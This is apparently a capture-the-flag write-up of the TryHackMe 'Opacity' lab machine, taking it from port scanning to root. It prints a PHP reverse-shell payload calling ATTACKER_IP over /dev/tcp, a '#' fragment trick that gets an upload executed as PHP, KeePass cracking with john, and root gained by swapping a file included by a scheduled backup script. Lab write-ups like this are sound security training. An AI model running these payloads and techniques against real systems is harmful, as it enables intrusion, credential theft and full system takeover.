TryHackMe — Opacity Write-Up 

⸻

1) Reconnaissance

Initial scan:

rustscan -a <IP> -- -A -oN initial.txt

Open Ports
	•	22 (SSH)
	•	80 (HTTP)
	•	139/445 (SMB)

Key Insight
	•	Web service → primary entry point
	•	SMB → no useful access

⸻

2) Web Enumeration

Access:

http://<IP>

Found:
	•	login.php

⸻

Directory Enumeration (Gobuster)

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

Discovery

/cloud


⸻

3) Vulnerability — File Fetch Upload

Inside /cloud:

External URL upload feature

➡️ Server downloads files from provided URL

⸻

4) Initial Foothold — Reverse Shell via Upload

Step 1: Create reverse shell

<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>


⸻

Step 2: Host payload

python3 -m http.server 8000


⸻

Step 3: Upload with bypass

http://ATTACKER_IP:8000/shell.php#a


⸻

Result
	•	File saved as:

shell.php#.png

	•	Due to parsing flaw → PHP executed

⸻

Step 4: Listener

nc -lvnp 4444

➡️ Immediately received shell as:

www-data

(No manual trigger required)

⸻

5) Post Exploitation — Enumeration

Found:

/opt/dataset.kdbx

➡️ KeePass database

⸻

6) Credential Extraction

Transfer file

# On target
cd /opt
python3 -m http.server 8000

# On attacker
wget http://<IP>:8000/dataset.kdbx


⸻

Crack password

keepass2john dataset.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Result:

741852963


⸻

Extract credentials

sysadmin : Cl0udP4ss40p4city#8700


⸻

7) User Access

ssh sysadmin@<IP>

Get user flag:

cat ~/local.txt


⸻

8) Privilege Escalation — Backup Script Abuse

Key Files

/home/sysadmin/scripts/script.php
/home/sysadmin/scripts/lib/backup.inc.php


⸻

Script Behavior

require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');

➡️ Loads backup.inc.php

⸻

9) Root Exploit (Actual Working Method)

Step 1: Replace included file

cd /home/sysadmin/scripts/lib
mv backup.inc.php backup.bak
wget http://ATTACKER_IP:8000/backup.inc.php

Payload:

<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>


⸻

Step 2: Listener

nc -lvnp 4444


⸻

Step 3: Wait

➡️ Script executed automatically (no manual trigger)

➡️ Received:

root shell


⸻

10) Root Flag

cat /root/proof.txt


⸻

11) Full Attack Chain
	1.	Port scan → web identified
	2.	Gobuster → /cloud
	3.	File fetch → upload bypass using #
	4.	Reverse shell → www-data
	5.	Found KeePass DB → cracked password
	6.	SSH → sysadmin
	7.	Replaced included file → root execution

⸻

12) Key Vulnerabilities
	•	Improper URL parsing (# bypass)
	•	Unsafe file fetch feature
	•	Sensitive file exposure (dataset.kdbx)
	•	Insecure file inclusion (require_once)
	•	Writable directory allowing file replacement

⸻

13) Important Lessons
	•	Always test URL fragments (#) in upload features
	•	Directory permissions can override file permissions
	•	Backup scripts are common privilege escalation vectors
	•	KeePass files often contain critical credentials

⸻

Status

✔ User flag obtained
✔ Root flag obtained
✔ Full system compromise complete